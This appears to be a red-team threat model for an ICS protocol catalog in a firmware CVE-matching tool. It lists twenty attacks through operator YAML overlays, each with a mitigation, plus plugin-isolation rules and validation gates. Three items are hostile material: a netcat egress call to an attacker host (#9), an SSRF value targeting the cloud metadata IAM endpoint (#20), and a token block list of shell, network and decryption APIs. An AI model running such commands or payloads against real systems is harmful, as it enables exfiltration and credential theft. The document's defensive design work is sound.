# Wave-1 Scout C — Red-Team Threat Model — ICS Protocol Catalog

**Attacker capabilities:** operator writes YAML at `.local` overlay (`manifest_source: operator`); cannot push attested_external; cannot edit Python. Worker-container is the security boundary (Rule #36).

## Attack Matrix (20 attacks)

| # | Name | Mechanism | Impact | Mitigation class |
|---|---|---|---|---|
| 1 | **Function-code wildcard mask** | `function_code_byte_hex: "00"` + `mask_hex: "00"` (all-zero mask) | False-positive cascade across whole corpus | schema-validator (extend file_format.py `all(c == "0"` mask rejection to ICS) |
| 2 | **Port-number aliasing** | OPC-UA signal `tcp_port: 23` (Telnet) → HTTP firmwares classify as DNP3 | CVE matcher over-attribution | closed `IcsTransportPort` Literal of canonical ports; operator override requires `precedence >= 5000` |
| 3 | **Magic-string copyright collision** | `"libmodbus"` substring matches every firmware that linked the lib statically | False-positive on every Linux firmware shipping libmodbus statically | schema-validator require `combine: all_required` with substring + function_code + magic_bytes |
| 4 | **Authority-laundering** | Operator's `.local/modbus.yaml` declares `manifest_source: _system` → impersonates curated | Operator narrowing rides curated attestation | load-time-gate (mirror catalog.py:270-278 `_expected_source_for_path`) |
| 5 | **Precedence-floor breach** | Operator declares `precedence: 5` (reserved [0,9] for _system) | Operator beats _system negative-evidence sentinels | schema-validator REJECT `precedence < 10 and manifest_source != '_system'` |
| 6 | **Dispatch-chain authority laundering (A6 analog)** | `_system` chain → operator-tier terminus with attacker-controlled vendor | Operator-controlled CVE narrowing rides curated attestation | cross-feature-validator A6 REJECT (not WARN) — CVE-feeding catalog needs strict |
| 7 | **Cross-vendor magic collision (A4 analog)** | DNP3 vs IEC-104 frame headers (0x05 0x64 vs 0x68 0x04) overlap | DNP3 mis-classified as IEC-104 | cross-feature-validator REJECT pairs with same precedence+offset+magic+different vendors |
| 8 | **CVE-attribution drift via free-string vendor** | OpenPLC firmware gets `vendor: siemens` → Siemens S7 CVEs fire | Over-attribution of vendor-specific CVEs | cross-feature-validator `derive_vendor_authority` from manifest_source; F-FORENSIC-10 analog requires narrowing |
| 9 | **Plugin subprocess egress** | Operator plugin calls `subprocess.run(["nc", attacker, "5060"])` | RCE in worker container | plugin-isolation: tokenize-scan + reject operator-supplied plugin source paths entirely |
| 10 | **Plugin network egress** | Plugin imports `httpx` for "vendor lookup" | Exfiltration via NVD-allowed egress | plugin-isolation same as #9 |
| 11 | **No-decrypt rule analog** | Plugin "deep-parses" DNP3-SA / OPC-UA SecureChannel → invokes `fernet.decrypt` | Parse-only walker becomes credential-decrypt path | plugin-isolation: Rule #45 token-scan for `.decrypt(`, `cryptography.`, `Crypto.Cipher`; whitespace-tolerant per Rule #46 |
| 12 | **Banner-string nationality attack** | Substring `"SIEMENS AG"` matches all Siemens-licensed firmware (printers, telco, etc.) | False-positive across Siemens ecosystem | constraint-strength floor: ≥8 bytes AND ALL-of needles + transport-port + function-code + magic |
| 13 | **Function-code mask escape hatch (A8 analog)** | DLMS APDU-tag range 0x00-0xFF — effective always_matches | analog of P3.2.b TextFormatConstraint A8 | cross-feature-validator A8 high-collision floor — operator with weak range requires `precedence >= 5000` |
| 14 | **YAML cycle: protocol-A → protocol-B → protocol-A** | dispatch.cases circular | DoS / async-task spawn loop | schema-validator: catalog-load BFS cycle-detect; REJECT cycles |
| 15 | **Category laundering via free-string `category`** | Operator declares `category: "windows_pe"` → bypasses ICS-CVE pipeline | Suppress legitimate ICS CVE attribution | closed Literal allowlist `IcsCategory` OR require `classifier_category` starts with `ics_` |
| 16 | **OPC-UA NodeId namespace-poisoning** | Operator declares `opc_ua_namespace_uri: "http://opcfoundation.org/UA/"` → matches every OPC-UA server | Vendor + product attribution riding namespace match | closed Literal of reserved namespace URIs |
| 17 | **EtherCAT EtherType-only attack** | `ethertype: 0x88A4` alone → any ELF with constant matches | False-positive on debug ELFs | require COMBINATION with state-machine signature + function-code + vendor-id field |
| 18 | **Cross-feature: ICS YAML hijacks file_format dispatch** | ICS YAML reuses `substring_in_head` kind with needle = ELF magic → competes in cost-sorted resolver | Cross-catalog hijack | architectural-isolation: separate resolver per catalog; SIGNAL_EVALUATORS NOT shared across catalogs |
| 19 | **Refinement-override category laundering** | `refinement.applies_when: any` → rewrites EVERY blob's category/vendor/product | Stamp every blob as attacker vendor | schema-validator REJECT `applies_when: any` for operator-tier; only _system / attested_external |
| 20 | **Provenance.attestation_url SSRF** | `attestation_url: "http://169.254.169.254/latest/meta-data/iam/"` | SSRF against worker container metadata | load-time-gate Rule #37 analog — attestation METADATA only, NEVER fetched at runtime |

## §SC5-Analog Candidates (W2-β must re-check)

**§SC5-NEW-ICS-1:** dispatch-rank + free-string vendor laundering. Combine A6 + A2 analogs. `_system` manifest with dispatch routes to operator-tier downstream. Operator authors downstream with `vendor: "siemens"`. Without strict `derive_vendor_authority` on the **terminus** (not entry), CVE matcher sees curated authority but operator-controlled vendor. **Mitigation:** A6-analog REJECT-not-WARN for ICS catalog; `derive_vendor_authority` MUST read chain TERMINUS.

**§SC5-NEW-ICS-2:** substring_in_head + transport_port combine-bypass. Operator declares `combine: any` with weak substring + weak port. Either signal alone is weak; `combine: any` accepts either. **Mitigation:** REJECT `combine: any` on operator-tier for ICS; require `all_required` OR `weighted` with `min_confidence_score >= 75`.

**§SC5-NEW-ICS-3:** deprecation.status: removed + dispatch.default fallback. Operator declares removal on a high-precedence ICS manifest expecting it to drop. But the NEW manifest also dispatches to the removed default. A3 drops the new manifest entirely → operator silent-deletes legitimate ICS detection. **Mitigation:** Severity-aware A3 — when `dispatch.default` references removed, surface as runtime-warning instead of hard drop.

**§SC5-NEW-ICS-4:** forward-prepared CVE pin × operator regex override. Rule #49 forward-prepared pins ship with hard-reject `version_regex`. An operator-tier ICS YAML carrying a PERMISSIVE `version_regex` for same tuple could override hard-reject narrowing. **Mitigation:** Mirror curated F-FORENSIC-10 gate to ICS — operator regex MUST be more-specific than curated.

## Defense recommendations (per attack class)

| Attack class | Closed-grammar mechanism |
|---|---|
| Mask wildcards (#1, #13) | model_validator REJECT all-zero mask AND range_max-range_min ≥ 32 from operator |
| Port aliasing (#2) | `IcsTransportPort` Literal closed allowlist; operator override `precedence >= 5000` AND attested_external |
| Magic-string copyright (#3, #12) | Schema require `combine: all_required` with N≥3 signals for operator-tier |
| manifest_source spoofing (#4) | Loader `_expected_source_for_path` REJECT |
| Precedence breach (#5) | Top-level `precedence < 10 and manifest_source != '_system'` rejection |
| Dispatch-chain (#6) | A6 analog tightened to REJECT for ICS |
| Cross-vendor magic (#7) | A4 analog REJECT same-precedence-same-magic-different-vendor |
| CVE drift (#8) | `derive_vendor_authority` mirror; F-FORENSIC-10 narrowing analog |
| Plugin attacks (#9-11) | Rule #36+#45 tokenize-scan AT IMPORT; REJECT operator plugins entirely |
| Cycle detection (#14) | Loader BFS cycle-detect; REJECT (not just depth_max cap) |
| Category laundering (#15) | Closed `IcsCategory` Literal OR require `ics_` prefix |
| Refinement abuse (#19) | `applies_when: any` REJECTED for operator |
| SSRF (#20) | attestation_url METADATA only, never fetched |

## Plugin-isolation requirements (if plugins supported)

1. **In-tree only.** No operator-supplied plugin directory. `data/ics_protocols.local/` carries YAML only.
2. **Token-scan at module import.** Forbidden: `subprocess`, `socket`, `requests`, `httpx`, `aiohttp`, `urllib`, `eval(`, `exec(`, `__import__`, `compile(`, `decrypt`, `Crypto.Cipher`, `cryptography.fernet`, `cryptography.hazmat`, `dpapi`, `CryptUnprotectData`, `Fernet`, `os.system`, `os.popen`, `pty.spawn`, `asyncio.create_subprocess`. Whitespace-tolerant per Rule #46.
3. **Paired META-CANARY** per Rule #46 — synthesize hostile plugin source in memory; assert gate REJECTS. NOT f-string (tokenize strips f-strings).
4. **`freeze_plugin_registry()` at startup** before first request.
5. **`side_effects: Literal["none"]` ONLY.**
6. **Plugin applicability allowlist.**
7. **`requires_network: False` constant** on plugin class.
8. **No-decrypt gate for ICS protocols carrying signed/encrypted payloads.**

## Cross-Feature Gates I1-I13 (analog of A1-A9)

| Gate | Description | Severity |
|---|---|---|
| I1 | `mode=override` × `manifest_source` rank parity (A1 mirror) | REJECT |
| I2 | `vendor_authority` from manifest_source, NEVER from dispatch chain entry (A2 mirror, terminus-aware) | REJECT |
| I3 | `dispatch.cases.*` × `deprecation.status: removed` (A3 mirror, downgraded to WARN for ICS to avoid §SC5-NEW-ICS-3) | WARN |
| I4 | Cross-vendor same-precedence same-magic collision (A4 mirror) | REJECT |
| I5 | `dispatch.depth_max >= 2` × eager expensive plugin (A5 mirror) | REJECT |
| I6 | dispatch-rank-monotonicity (A6 mirror, REJECT for CVE-feeding) | REJECT |
| I7 | Plugin-namespace-disjointness (A7 mirror) | REJECT |
| I8 | High-collision floor: operator weak signal × precedence < 5000 (A8 mirror) | REJECT |
| I9 | `protocol_id` sanitization (A9 mirror) | WARN |
| I10 NEW | Transport-port × protocol-family agreement (502 ≠ DNP3; 20000 ≠ OPC-UA) | REJECT |
| I11 NEW | F-FORENSIC-10 analog — CVE-bearing curated entry requires narrowing beyond (vendor, category) | REJECT |
| I12 NEW | Refinement `applies_when: any` REJECTED for operator | REJECT |
| I13 NEW | Dispatch-cycle detection BFS | REJECT |

## Top 3 ATTACKS W2-β must re-check

1. **§SC5-NEW-ICS-1** — dispatch terminus authority. Highest severity (CVE-feeding). Schema-only insufficient — needs catalog-load BFS walk.
2. **§SC5-NEW-ICS-2** — combine-mode + transport_port + substring permissive composition. Direct analog of P3.2.b §SC5-NEW-2.
3. **§SC5-NEW-ICS-4** — forward-prepared CVE pin × operator regex override.

**Bottom line:** the CVE-feeding nature of ICS makes attacks #6, #8, #11, #17 substantially more dangerous than file-format. file_format-catalog A6/A8/A9 gates MUST be TIGHTENED (not just mirrored) for ICS, because downstream consumer (CVE matcher) has stricter authority requirements.
